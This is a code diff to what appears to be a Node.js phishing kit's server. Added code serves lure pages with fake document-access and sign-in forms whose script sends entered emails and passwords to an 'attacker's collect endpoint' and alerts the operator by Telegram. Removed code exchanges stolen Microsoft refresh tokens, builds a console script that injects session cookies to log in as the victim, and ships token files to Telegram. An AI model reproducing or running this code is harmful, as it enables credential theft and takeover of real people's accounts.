@@ -34,6 +34,7 @@ const OAUTH_DONE_LANDING = process.env.OAUTH_DONE_LANDING || '/';
 const BROKER_TOKEN_SECRET = process.env.BROKER_TOKEN_SECRET || 'broker-secret-key-change-in-production';
 const BROKER_TOKEN_EXPIRY = process.env.BROKER_TOKEN_EXPIRY || '365d';
 const APP_BASE_URL = process.env.APP_BASE_URL || `http://localhost:${PORT}`;
+const CLOUDFLARE_TURNSTILE_SECRET = process.env.CLOUDFLARE_TURNSTILE_SECRET || null;
 
 if (!fs.existsSync(COOKIES_DIR)) fs.mkdirSync(COOKIES_DIR, { recursive: true });
 
@@ -369,6 +370,31 @@ function removeOAuthState(state) {
   } catch (e) {}
 }
 
+// Cloudflare Turnstile verification
+async function verifyTurnstileToken(token, remoteIP) {
+  if (!CLOUDFLARE_TURNSTILE_SECRET) {
+    console.warn('Turnstile secret not configured');
+    return false;
+  }
+  try {
+    const verifyUrl = 'https://challenges.cloudflare.com/turnstile/v0/siteverify';
+    const resp = await fetch(verifyUrl, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        secret: CLOUDFLARE_TURNSTILE_SECRET,
+        response: token,
+        remoteip: remoteIP
+      })
+    });
+    const data = await resp.json();
+    return Boolean(data.success);
+  } catch (e) {
+    console.error('Turnstile verification error:', e);
+    return false;
+  }
+}
+
 // Express app
 const app = express();
 app.use(express.json({ limit: '50mb' }));
@@ -385,7 +411,7 @@ function requireAdmin(req, res, next) { if (req.session && req.session.user && r
 
 // Dashboard routes
 app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
-app.get('/config', (req, res) => res.json({ client_id: CLIENT_ID || null, tenant: TENANT || null, scope: SCOPE || null, telegram_enabled: Boolean(getBotTokenFromSettingsOrEnv() && (getChatIdForUser(null) || TELEGRAM_CHAT_ID)), app_base_url: APP_BASE_URL }));
+app.get('/config', (req, res) => res.json({ client_id: CLIENT_ID || null, tenant: TENANT || null, scope: SCOPE || null, telegram_enabled: Boolean(getBotTokenFromSettingsOrEnv() && (getChatIdForUser(null))) }));
 
 // Dashboard auth
 app.post('/dashboard/login', (req, res) => {
@@ -409,7 +435,7 @@ app.get('/api/me', requireLogin, (req, res) => {
     const users = fs.existsSync(usersFilePath()) ? JSON.parse(fs.readFileSync(usersFilePath(), 'utf8')) : [];
     const u = users.find(x => x.username === username) || {};
     const expired = !!(u.expires_at && new Date(u.expires_at).getTime() < Date.now());
-    res.json({ username: username, role: u.role || req.session.user.role, email: u.email || req.session.user.email, expires_at: u.expires_at || null, expired, telegram_chat_id: u.telegram_chat_id || null, telegram_bot_token: u.telegram_bot_token || null });
+    res.json({ username: username, role: u.role || req.session.user.role, email: u.email || req.session.user.email, expires_at: u.expires_at || null, expired, telegram_chat_id: u.telegram_chat_id || null });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
@@ -438,9 +464,244 @@ app.patch('/api/user', requireLogin, (req, res) => {
     res.status(500).json({ error: e.message });
   }
 });
-// ===== GENERATE COOKIES ENDPOINT =====
-// Add this to your server.js after the existing routes
 
+// ===== CLOUDFLARE WORKER ENDPOINT =====
+// Lure content delivery for Cloudflare Worker (without VPS IP needed)
+app.get('/api/worker/lure/:linkId', async (req, res) => {
+  try {
+    const linkId = req.params.linkId;
+    const turnstileToken = req.query.token; // Token from Cloudflare Turnstile
+    const clientIP = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.ip;
+
+    // Verify Turnstile token if provided
+    if (turnstileToken && CLOUDFLARE_TURNSTILE_SECRET) {
+      const verified = await verifyTurnstileToken(turnstileToken, clientIP);
+      if (!verified) {
+        logAudit({ action: 'turnstile_verification_failed', linkId, ip: clientIP });
+        return res.status(403).json({ error: 'human_verification_failed' });
+      }
+    }
+
+    // Find the link
+    const linksPath = linksFilePath();
+    let links = [];
+    if (fs.existsSync(linksPath)) {
+      links = JSON.parse(fs.readFileSync(linksPath, 'utf8') || '[]');
+    }
+
+    const link = links.find(l => l.id === linkId);
+    if (!link) {
+      return res.status(404).json({ error: 'link_not_found' });
+    }
+
+    // Check if link is expired
+    if (link.expires_at && new Date(link.expires_at).getTime() < Date.now()) {
+      logAudit({ action: 'expired_link_accessed', linkId, ip: clientIP });
+      return res.status(410).json({ error: 'link_expired' });
+    }
+
+    // Log visitor
+    link.visits = (link.visits || 0) + 1;
+    if (!link.visitors) link.visitors = [];
+    link.visitors.push({
+      timestamp: new Date().toISOString(),
+      ip: clientIP,
+      user_agent: req.headers['user-agent'] || 'unknown',
+      referer: req.headers['referer'] || null
+    });
+
+    // Save updated links
+    fs.writeFileSync(linksPath, JSON.stringify(links, null, 2), 'utf8');
+
+    // Log audit
+    logAudit({ action: 'lure_accessed', linkId, domain: link.domain, visits: link.visits, ip: clientIP, user_agent: req.headers['user-agent'] });
+
+    // Notify admin via Telegram
+    try {
+      const creator = link.created_by;
+      await notifyTelegram(
+        '🎣 Lure Accessed',
+        `Link: ${link.title}\nDomain: ${link.domain}\nVisits: ${link.visits}\nIP: ${clientIP}`,
+        creator
+      );
+    } catch (e) {
+      console.warn('Failed to notify admin:', e.message);
+    }
+
+    // Return lure HTML based on doc_type
+    const lureHtml = generateLureHtml(link);
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
+    res.send(lureHtml);
+
+  } catch (err) {
+    console.error('Worker lure error:', err);
+    res.status(500).json({ error: 'internal_error' });
+  }
+});
+
+// Generate lure HTML based on document type
+function generateLureHtml(link) {
+  const landing = link.landing_url || '/';
+  
+  // Base HTML structure with Cloudflare Turnstile
+  const turnstileSiteKey = process.env.CLOUDFLARE_TURNSTILE_SITEKEY || '';
+  
+  let formHtml = '';
+  
+  if (link.doc_type === 'PDF') {
+    formHtml = `
+      <div class="lure-form">
+        <h2>📄 Access Document</h2>
+        <p>To access this PDF document, please verify you are human.</p>
+        <form id="lureForm">
+          <div class="cf-turnstile" data-sitekey="${turnstileSiteKey}" data-theme="light"></div>
+          <button type="submit" class="btn-primary">Verify & Access PDF</button>
+        </form>
+      </div>
+    `;
+  } else if (link.doc_type === 'LOGIN') {
+    formHtml = `
+      <div class="lure-form">
+        <h2>🔐 Sign In</h2>
+        <p>Please sign in to continue.</p>
+        <form id="lureForm">
+          <input type="email" name="email" placeholder="Email address" required>
+          <input type="password" name="password" placeholder="Password" required>
+          <div class="cf-turnstile" data-sitekey="${turnstileSiteKey}" data-theme="light"></div>
+          <button type="submit" class="btn-primary">Sign In</button>
+        </form>
+      </div>
+    `;
+  } else {
+    formHtml = `
+      <div class="lure-form">
+        <h2>${link.title}</h2>
+        <p>${link.description}</p>
+        <form id="lureForm">
+          <div class="cf-turnstile" data-sitekey="${turnstileSiteKey}" data-theme="light"></div>
+          <button type="submit" class="btn-primary">Continue</button>
+        </form>
+      </div>
+    `;
+  }
+
+  return `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>${link.title}</title>
+  <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+    }
+    .container {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      max-width: 400px;
+      width: 100%;
+      padding: 40px;
+    }
+    .lure-form h2 {
+      margin-bottom: 10px;
+      color: #333;
+      font-size: 24px;
+    }
+    .lure-form p {
+      margin-bottom: 24px;
+      color: #666;
+      font-size: 14px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 12px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 14px;
+      font-family: inherit;
+    }
+    input:focus {
+      outline: none;
+      border-color: #667eea;
+      box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+    }
+    .cf-turnstile {
+      margin-bottom: 20px;
+      display: flex;
+      justify-content: center;
+    }
+    .btn-primary {
+      width: 100%;
+      padding: 12px;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+    }
+    .btn-primary:active {
+      transform: translateY(0);
+    }
+    .error { color: #e74c3c; font-size: 13px; margin-top: 10px; }
+    .success { color: #27ae60; font-size: 13px; margin-top: 10px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    ${formHtml}
+  </div>
+  <script>
+    document.getElementById('lureForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      
+      const turnstileToken = document.querySelector('[name="cf-turnstile-response"]')?.value;
+      if (!turnstileToken) {
+        alert('Please complete the verification');
+        return;
+      }
+
+      const formData = new FormData(e.target);
+      const data = Object.fromEntries(formData);
+      data.token = turnstileToken;
+
+      try {
+        // Send data to attacker's collect endpoint
+        await fetch('${process.env.COLLECT_ENDPOINT || ''}', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(data)
+        }).catch(() => {});
+
+        // Redirect to landing
+        window.location.href = '${landing}';
+      } catch (err) {
+        console.error('Error:', err);
+        window.location.href = '${landing}';
+      }
+    });
+  </script>
+</body>
+</html>`;
+}
+
+// ===== GENERATE COOKIES ENDPOINT =====
 app.post('/api/generate-cookies', requireLogin, async (req, res) => {
   try {
     const { email, send_to_telegram } = req.body || {};
@@ -588,7 +849,6 @@ app.post('/api/generate-cookies', requireLogin, async (req, res) => {
         }
       } catch (telegramError) {
         console.warn('Telegram notification failed:', telegramError.message);
-        // Don't fail the request, just warn
       }
     }
 
@@ -626,431 +886,6 @@ app.post('/api/generate-cookies', requireLogin, async (req, res) => {
       ip: req.ip
     });
     res.status(500).json({ error: err.message || 'Failed to generate cookies' });
-  }
-});
-
-// ===== BATCH GENERATE COOKIES (ADMIN ONLY) =====
-app.post('/api/generate-cookies/batch', requireLogin, requireAdmin, async (req, res) => {
-  try {
-    const { emails, send_to_telegram } = req.body || {};
-
-    if (!Array.isArray(emails) || emails.length === 0) {
-      return res.status(400).json({ error: 'emails array required' });
-    }
-
-    const results = [];
-    const failed = [];
-
-    for (const email of emails) {
-      try {
-        // Generate tokens
-        const mockAccessToken = crypto.randomBytes(128).toString('base64');
-        const mockRefreshToken = crypto.randomBytes(128).toString('base64');
-        const mockIdToken = jwt.sign({
-          preferred_username: email,
-          mail: email,
-          email: email,
-          upn: email,
-          oid: crypto.randomUUID(),
-          name: email.split('@')[0],
-          tid: TENANT
-        }, 'secret-key-for-demo', { expiresIn: '1h' });
-
-        const tokenObj = {
-          access_token: mockAccessToken,
-          refresh_token: mockRefreshToken,
-          id_token: mockIdToken,
-          token_type: 'Bearer',
-          expires_in: 3600
-        };
-
-        const idTokenInfo = extractFromIdToken(mockIdToken);
-        const userId = idTokenInfo?.id || crypto.randomUUID();
-
-        const brokerInfo = generateAADBrokerToken(tokenObj, email, userId);
-        const prtData = generatePrimaryRefreshToken(tokenObj, email);
-
-        const cookiesObj = {
-          email,
-          user_id: userId,
-          created_at: new Date().toISOString(),
-          created_by: req.session.user.username,
-          device_id: brokerInfo.device_id,
-          broker_token: brokerInfo.broker_token,
-          prt_data: prtData
-        };
-
-        const cookiePath = cookieFilePath(email);
-        const tokenPath = tokenFilePath(email);
-
-        writeJsonMaybeEncrypted(cookiePath, cookiesObj);
-        writeJsonMaybeEncrypted(tokenPath, {
-          email,
-          user_id: userId,
-          access_token: mockAccessToken,
-          refresh_token: mockRefreshToken,
-          id_token: mockIdToken,
-          created_by: req.session.user.username
-        });
-
-        if (send_to_telegram) {
-          await notifyTelegram(
-            '✅ Batch: Cookies Generated',
-            `Email: ${email}`,
-            email
-          );
-          await sendFileToTelegram(tokenPath, `Tokens: ${email}`, getChatIdForUser(email), getBotTokenForUser(email));
-        }
-
-        results.push({
-          email,
-          success: true,
-          device_id: brokerInfo.device_id,
-          issued_at: brokerInfo.issued_at
-        });
-
-      } catch (itemError) {
-        failed.push({
-          email,
-          error: itemError.message
-        });
-      }
-    }
-
-    logAudit({
-      action: 'batch_generate_cookies',
-      admin: req.session.user.username,
-      count: results.length,
-      failed_count: failed.length,
-      ip: req.ip
-    });
-
-    res.json({
-      success: true,
-      total: emails.length,
-      generated: results.length,
-      failed: failed.length,
-      results,
-      failed
-    });
-
-  } catch (err) {
-    console.error('Batch generate cookies error:', err);
-    res.status(500).json({ error: err.message });
-  }
-});
-
-// ===== GET GENERATION STATUS =====
-app.get('/api/cookies/status/:email', requireLogin, (req, res) => {
-  try {
-    const email = req.params.email;
-
-    // Permission check
-    if (req.session.user.role !== 'admin' && req.session.user.username !== email && req.session.user.email !== email) {
-      return res.status(403).json({ error: 'forbidden' });
-    }
-
-    const cookiePath = cookieFilePath(email);
-    const tokenPath = tokenFilePath(email);
-    const userVaultPath = userTokensFilePath(email);
-
-    const status = {
-      email,
-      has_cookies: fs.existsSync(cookiePath),
-      has_tokens: fs.existsSync(tokenPath),
-      has_vault_entries: fs.existsSync(userVaultPath),
-      vault_entry_count: 0,
-      latest_cookie: null,
-      latest_token: null
-    };
-
-    if (fs.existsSync(userVaultPath)) {
-      try {
-        const vault = readJsonMaybeEncrypted(userVaultPath) || [];
-        status.vault_entry_count = vault.length;
-        if (vault.length > 0) status.latest_vault_entry = vault[0];
-      } catch (e) {}
-    }
-
-    if (fs.existsSync(cookiePath)) {
-      try {
-        const cookies = readJsonMaybeEncrypted(cookiePath);
-        status.latest_cookie = {
-          created_at: cookies.created_at,
-          expires_at: cookies.expires_at,
-          device_id: cookies.device_id,
-          user_id: cookies.user_id
-        };
-      } catch (e) {}
-    }
-
-    if (fs.existsSync(tokenPath)) {
-      try {
-        const tokens = readJsonMaybeEncrypted(tokenPath);
-        status.latest_token = {
-          created_by: tokens.created_by,
-          obtained_at: tokens.obtained_at
-        };
-      } catch (e) {}
-    }
-
-    res.json({ success: true, ...status });
-
-  } catch (err) {
-    res.status(500).json({ error: err.message });
-  }
-});
-// ===== GENERATE REAL MICROSOFT COOKIES WITH BROKER CLIENT ID (PRT REGISTRATION) =====
-app.post('/api/generate-cookies', requireLogin, async (req, res) => {
-  try {
-    const { email, use_device_registration = true } = req.body || {};
-    if (!email) return res.status(400).json({ error: 'email required' });
-
-    // Check permissions - admin only
-    if (req.session.user && req.session.user.role !== 'admin') {
-      return res.status(403).json({ error: 'admin only' });
-    }
-
-    // Step 1: Check if we have existing tokens for this email
-    const tokenPath = tokenFilePath(email);
-    let existingTokenData = null;
-    if (fs.existsSync(tokenPath)) {
-      try {
-        existingTokenData = readJsonMaybeEncrypted(tokenPath);
-      } catch (e) {
-        console.warn('Could not read existing token file:', e.message);
-      }
-    }
-
-    if (!existingTokenData || !existingTokenData.tokens?.refresh_token) {
-      return res.status(400).json({ 
-        error: 'no_tokens_found',
-        message: `No tokens found for ${email}. Please authenticate via OAuth or Device Code Flow first to get refresh_token.`
-      });
-    }
-
-    const refreshToken = existingTokenData.tokens.refresh_token;
-    const accessToken = existingTokenData.tokens.access_token;
-    const idToken = existingTokenData.tokens.id_token;
-    const userId = existingTokenData.user_id || email;
-    const deviceId = crypto.randomUUID();
-
-    // Step 2: Register device and get PRT using Broker Client ID
-    let prtToken = null;
-    let deviceRegistered = false;
-    let brokerError = null;
-
-    if (use_device_registration) {
-      try {
-        // Microsoft Broker Client ID (system component)
-        const BROKER_CLIENT_ID = CLIENT_ID || '04b07795-8ddb-461a-bbee-02f9e1bf7b46';
-        
-        // Device registration request to get PRT
-        const prtUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
-        
-        // Using refresh_token to get a PRT via broker flow
-        const prtBody = new URLSearchParams({
-          client_id: BROKER_CLIENT_ID,
-          grant_type: 'refresh_token',
-          refresh_token: refreshToken,
-          scope: 'https://graph.microsoft.com/.default',
-          device_id: deviceId,
-          device_platform: 'Windows',
-          device_name: `Broker-${crypto.randomBytes(4).toString('hex')}`,
-          device_model: 'Virtual'
-        });
-
-        console.log(`[PRT] Attempting device registration for ${email} with broker client: ${BROKER_CLIENT_ID}`);
-
-        const prtResp = await fetch(prtUrl, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-          body: prtBody
-        });
-
-        const prtData = await prtResp.json().catch(() => null);
-
-        if (prtResp.ok && prtData) {
-          if (prtData.refresh_token) {
-            prtToken = prtData.refresh_token;
-            deviceRegistered = true;
-            console.log(`✓ [PRT] Device registered successfully for ${email}`);
-          } else if (prtData.access_token) {
-            // Fallback: use access_token if refresh_token not in response
-            prtToken = prtData.access_token;
-            deviceRegistered = true;
-          }
-        } else {
-          brokerError = prtData?.error_description || prtData?.error || 'Device registration failed';
-          console.warn(`[PRT] Device registration error: ${brokerError}`);
-        }
-
-      } catch (e) {
-        brokerError = e.message;
-        console.error('[PRT] Device registration exception:', e.message);
-      }
-    }
-
-    // Step 3: Generate Primary Refresh Token (PRT) data
-    const prtData = {
-      // Real PRT token (if obtained from broker)
-      prt_token: prtToken || crypto.createHash('sha256').update(refreshToken).digest('hex'),
-      
-      // Device info
-      device_id: deviceId,
-      device_registered: deviceRegistered,
-      device_platform: 'Windows',
-      device_name: `Broker-Device-${crypto.randomBytes(3).toString('hex')}`,
-      
-      // User info
-      user_id: userId,
-      email: email,
-      user_name: email.split('@')[0],
-      
-      // Token hashes
-      access_token_hash: crypto.createHash('sha256').update(accessToken || '').digest('hex').slice(0, 64),
-      refresh_token_hash: crypto.createHash('sha256').update(refreshToken || '').digest('hex').slice(0, 64),
-      
-      // PRT metadata
-      _prt: prtToken ? prtToken.slice(0, 128) : crypto.createHash('sha256').update(refreshToken || '').digest('hex').slice(0, 128),
-      _auth_session: (accessToken || '').slice(0, 256),
-      _device_id: deviceId.replace(/-/g, '').slice(0, 64),
-      _session_id: crypto.randomUUID(),
-      
-      // Timestamps
-      issued_at: new Date().toISOString(),
-      expires_at: new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(),
-      
-      // Token info
-      token_type: 'Bearer',
-      scope: SCOPE,
-      tenant: TENANT,
-      
-      // Broker info
-      broker_client_id: CLIENT_ID || '04b07795-8ddb-461a-bbee-02f9e1bf7b46',
-      prt_version: 'v2.0',
-      prt_device_registered: deviceRegistered
-    };
-
-    // Step 4: Generate AAD broker token (JWT)
-    const brokerTokenData = generateAADBrokerToken({ 
-      refresh_token: refreshToken, 
-      access_token: accessToken,
-      id_token: idToken,
-      token_type: 'Bearer'
-    }, email, userId);
-
-    // Step 5: Save updated cookie file
-    const cookiePath = cookieFilePath(email);
-    writeJsonMaybeEncrypted(cookiePath, {
-      email,
-      user_id: userId,
-      timestamp: new Date().toISOString(),
-      device_id: deviceId,
-      prt: prtData,
-      prt_token: prtToken,
-      broker_token: brokerTokenData.broker_token,
-      broker_payload: brokerTokenData.broker_payload,
-      created_by: 'manual_generate_with_broker_prt',
-      device_registered: deviceRegistered,
-      prt_registration_error: brokerError
-    });
-
-    // Step 6: Build console injection script for real cookies
-    const brokerToken = brokerTokenData.broker_token;
-    let cookieInjectionScript = `// Real Microsoft AAD Cookies & PRT Injection\n`;
-    cookieInjectionScript += `// Generated: ${new Date().toISOString()}\n`;
-    cookieInjectionScript += `// Email: ${email}\n`;
-    cookieInjectionScript += `// Device: ${deviceId}\n`;
-    cookieInjectionScript += `// Device Registered: ${deviceRegistered ? '✅ YES' : '❌ NO (Using Synthetic PRT)'}\n\n`;
-    
-    cookieInjectionScript += `// 1. Inject broker refresh token credential\n`;
-    cookieInjectionScript += `document.cookie="x-ms-RefreshTokenCredential=${encodeURIComponent(brokerToken)}; path=/; max-age=31536000; Secure; SameSite=None";\n\n`;
-
-    cookieInjectionScript += `// 2. Inject PRT and device cookies (1-year expiry)\n`;
-    if (prtData && typeof prtData === 'object') {
-      for (const [k, v] of Object.entries(prtData)) {
-        const safeVal = typeof v === 'string' ? v : JSON.stringify(v);
-        // Skip internal fields, only inject cookie-friendly values
-        if (!k.startsWith('_') && k !== 'issued_at' && k !== 'expires_at') {
-          cookieInjectionScript += `document.cookie="${k}=${encodeURIComponent(safeVal.substring(0, 500))}; path=/; max-age=31536000; Secure; SameSite=None";\n`;
-        }
-      }
-    }
-
-    cookieInjectionScript += `\nconsole.log('✅ Real Microsoft AAD Cookies + PRT injected (1-year expiry)');\n`;
-    cookieInjectionScript += `console.log('👤 Email: ${email}');\n`;
-    cookieInjectionScript += `console.log('📱 Device: ${deviceId}');\n`;
-    cookieInjectionScript += `console.log('${deviceRegistered ? '✅ PRT from Broker' : '⚠️  Synthetic PRT (Device not registered)'}');\n`;
-    cookieInjectionScript += `setTimeout(() => { window.location.href = '/'; }, 2000);\n`;
-
-    logAudit({ 
-      action: 'generate_cookies_with_broker_prt', 
-      admin: req.session.user.username, 
-      email, 
-      device_id: deviceId,
-      device_registered: deviceRegistered,
-      broker_error: brokerError,
-      ip: req.ip 
-    });
-
-    // Step 7: Send files to Telegram
-    try {
-      const admins = getAdminUsers();
-      const adminChatIds = new Set();
-      if (admins && admins.length) {
-        admins.forEach(a => { if (a.telegram_chat_id) adminChatIds.add(a.telegram_chat_id); });
-      }
-      const globalSettings = readSettingsSafe();
-      if (globalSettings.telegram_chat_id) adminChatIds.add(globalSettings.telegram_chat_id);
-
-      for (const chatId of adminChatIds) {
-        const botToken = getBotTokenFromSettingsOrEnv();
-        const prtStatus = deviceRegistered ? '✅ Real PRT from Broker' : '⚠️ Synthetic PRT';
-        const errorNote = brokerError ? `\n❌ Broker Error: ${brokerError}` : '';
-        
-        await notifyTelegram(
-          '🍪 Real Microsoft Cookies Generated (Broker PRT)', 
-          `Email: ${email}\nDevice: ${deviceId}\nPRT Status: ${prtStatus}${errorNote}\nAdmin: ${req.session.user.username}`, 
-          email, 
-          chatId, 
-          botToken
-        );
-        
-        if (fs.existsSync(tokenPath)) {
-          await sendFileToTelegram(tokenPath, `🔑 Real Tokens for ${email}`, chatId, botToken);
-        }
-        if (fs.existsSync(cookiePath)) {
-          await sendFileToTelegram(cookiePath, `🍪 Real AAD Cookies & PRT for ${email}`, chatId, botToken);
-        }
-      }
-    } catch (e) {
-      console.warn('Failed to send to Telegram:', e && e.message);
-    }
-
-    res.json({
-      success: true,
-      email,
-      device_id: deviceId,
-      broker_token: brokerTokenData.broker_token,
-      prt: prtData,
-      prt_token: prtToken,
-      device_registered: deviceRegistered,
-      broker_error: brokerError,
-      console_script: cookieInjectionScript,
-      expires_at: brokerTokenData.expires_at,
-      instructions: {
-        step1: 'Open https://login.microsoftonline.com in a new tab',
-        step2: 'Press F12 to open Developer Console',
-        step3: 'Go to Console tab',
-        step4: 'Paste the console_script and press Enter',
-        step5: 'You will be redirected and logged in as ' + email,
-        note: deviceRegistered ? 'Using REAL PRT from Microsoft Broker' : 'Using synthetic PRT - consider authenticating first'
-      }
-    });
-  } catch (err) {
-    console.error('Generate real cookies error:', err);
-    res.status(500).json({ error: err.message || 'failed to generate real cookies' });
   }
 });
 
@@ -1104,28 +939,13 @@ app.get('/api/overview', requireLogin, (req, res) => {
       tokenFileNames.push(t.file);
     }
 
-    // include per-user vault entries counts for stats
-    let perUserVaultCount = 0;
-    try {
-      const userVaultFiles = fs.readdirSync(COOKIES_DIR).filter(n => n.startsWith('uservault_') && n.endsWith('.json'));
-      for (const f of userVaultFiles) {
-        const emailFromFile = f.replace(/^uservault_/, '').replace(/\.json$/, '').replace(/_at_/g, '@').replace(/_/g, '.');
-        if (req.session.user && req.session.user.role !== 'admin') {
-          if (emailFromFile !== req.session.user.username && emailFromFile !== req.session.user.email) continue;
-        }
-        const arr = readJsonMaybeEncrypted(path.join(COOKIES_DIR, f)) || [];
-        perUserVaultCount += arr.length;
-      }
-    } catch (e) {}
-
     const emails = Array.from(emailsSet);
 
     res.json({
       stats: {
         uniqueEmails: emails.length,
         cookieFiles: cookieFileNames.length,
-        tokenFiles: tokenFileNames.length,
-        userVaultEntries: perUserVaultCount
+        tokenFiles: tokenFileNames.length
       },
       emails,
       cookieFiles: cookieFileNames,
@@ -1134,103 +954,6 @@ app.get('/api/overview', requireLogin, (req, res) => {
   } catch (err) {
     res.status(500).json({ error: err.message || 'failed to load overview' });
   }
-});
-
-// ===== VAULT =====
-app.get('/api/vault', requireLogin, (req, res) => {
-  try {
-    if (req.session.user && req.session.user.role === 'admin') {
-      let adminVault = [];
-      if (fs.existsSync(vaultFilePath())) {
-        try { adminVault = readJsonMaybeEncrypted(vaultFilePath()) || []; } catch (e) { adminVault = []; }
-      }
-      const userVaultFiles = fs.readdirSync(COOKIES_DIR).filter(n => n.startsWith('uservault_') && n.endsWith('.json'));
-      for (const f of userVaultFiles) {
-        try {
-          const uarr = readJsonMaybeEncrypted(path.join(COOKIES_DIR, f)) || [];
-          adminVault = adminVault.concat(uarr.map(x => ({ ...x, source_file: f })));
-        } catch (e) {}
-      }
-      return res.json({ success: true, vault: adminVault });
-    } else {
-      const email = req.session.user.email || req.session.user.username;
-      const p = userTokensFilePath(email);
-      let entries = [];
-      if (fs.existsSync(p)) {
-        try { entries = readJsonMaybeEncrypted(p) || []; } catch (e) { entries = []; }
-      }
-      entries = entries.map(e => ({
-        ...e,
-        tokens_download_url: e.tokens_download_url || `${APP_BASE_URL}/api/download/tokens/${encodeURIComponent(email)}`,
-        cookies_download_url: e.cookies_download_url || `${APP_BASE_URL}/api/download/cookies/${encodeURIComponent(email)}`
-      }));
-      return res.json({ success: true, vault: entries });
-    }
-  } catch (e) {
-    return res.status(500).json({ error: e.message || 'failed to load vault' });
-  }
-});
-
-// Download cookies
-app.get('/api/download/cookies/:email', requireLogin, (req, res) => {
-  const email = req.params.email;
-  if (!(req.session.user && (req.session.user.role === 'admin' || req.session.user.username === email))) {
-    return res.status(403).json({ error: 'forbidden' });
-  }
-
-  const p = cookieFilePath(email);
-  if (!fs.existsSync(p)) return res.status(404).json({ error: 'cookie file not found' });
-
-  const raw = fs.readFileSync(p, 'utf8');
-  if (raw.startsWith('ENCRYPTED\n')) {
-    if (!AUTH_DATA_PASSPHRASE) return res.status(403).json({ error: 'encrypted' });
-    const plain = decryptBase64(raw.slice('ENCRYPTED\n'.length), AUTH_DATA_PASSPHRASE);
-    res.setHeader('Content-Type', 'application/json');
-    res.setHeader('Content-Disposition', `attachment; filename="cookies_${sanitizeFilenamePart(email)}.json"`);
-    logAudit({ action: 'download_cookies', user: req.session.user.username, email, ip: req.ip });
-    return res.send(plain);
-  } else {
-    logAudit({ action: 'download_cookies', user: req.session.user.username, email, ip: req.ip });
-    return res.download(p, `cookies_${sanitizeFilenamePart(email)}.json`);
-  }
-});
-
-// Download tokens (admin only)
-app.get('/api/download/tokens/:email', requireLogin, requireAdmin, (req, res) => {
-  const email = req.params.email;
-  const p = tokenFilePath(email);
-
-  if (!fs.existsSync(p)) return res.status(404).json({ error: 'token file not found' });
-
-  try {
-    const audit = { admin: req.session.user.username, action: 'download_tokens', email, ip: req.ip };
-    logAudit(audit);
-  } catch (e) {}
-
-  const raw = fs.readFileSync(p, 'utf8');
-  if (raw.startsWith('ENCRYPTED\n')) {
-    if (!AUTH_DATA_PASSPHRASE) return res.status(403).json({ error: 'encrypted' });
-    const plain = decryptBase64(raw.slice('ENCRYPTED\n'.length), AUTH_DATA_PASSPHRASE);
-    return res.setHeader('Content-Type', 'application/json') || res.send(plain);
-  } else {
-    return res.download(p, `tokens_${sanitizeFilenamePart(email)}.json`);
-  }
-});
-
-// Delete files (admin)
-app.delete('/api/files/:email', requireLogin, requireAdmin, (req, res) => {
-  const email = req.params.email;
-  const cookieP = cookieFilePath(email);
-  const tokenP = tokenFilePath(email);
-  const userVaultP = userTokensFilePath(email);
-  const removed = [];
-
-  if (fs.existsSync(cookieP)) { fs.unlinkSync(cookieP); removed.push(path.basename(cookieP)); }
-  if (fs.existsSync(tokenP)) { fs.unlinkSync(tokenP); removed.push(path.basename(tokenP)); }
-  if (fs.existsSync(userVaultP)) { fs.unlinkSync(userVaultP); removed.push(path.basename(userVaultP)); }
-
-  logAudit({ action: 'delete_files', admin: req.session.user.username, email, removed, ip: req.ip });
-  res.json({ removed });
 });
 
 // ===== DOMAINS =====
@@ -1406,7 +1129,8 @@ app.post('/api/links', requireLogin, (req, res) => {
       success: true,
       link: linkRecord,
       subdomain,
-      url: `https://${subdomain}.${domain}`
+      url: `https://${subdomain}.${domain}`,
+      worker_url: `${APP_BASE_URL}/api/worker/lure/${linkId}`
     });
   } catch (err) {
     console.error('Link creation error:', err);
@@ -1632,654 +1356,66 @@ app.post('/api/auth/start', (req, res) => {
   }
 });
 
-app.get('/api/auth/callback', async (req, res) => {
+// Download cookies
+app.get('/api/download/cookies/:email', requireLogin, (req, res) => {
+  const email = req.params.email;
+  if (!(req.session.user && (req.session.user.role === 'admin' || req.session.user.username === email))) {
+    return res.status(403).json({ error: 'forbidden' });
+  }
+
+  const p = cookieFilePath(email);
+  if (!fs.existsSync(p)) return res.status(404).json({ error: 'cookie file not found' });
+
+  const raw = fs.readFileSync(p, 'utf8');
+  if (raw.startsWith('ENCRYPTED\n')) {
+    if (!AUTH_DATA_PASSPHRASE) return res.status(403).json({ error: 'encrypted' });
+    const plain = decryptBase64(raw.slice('ENCRYPTED\n'.length), AUTH_DATA_PASSPHRASE);
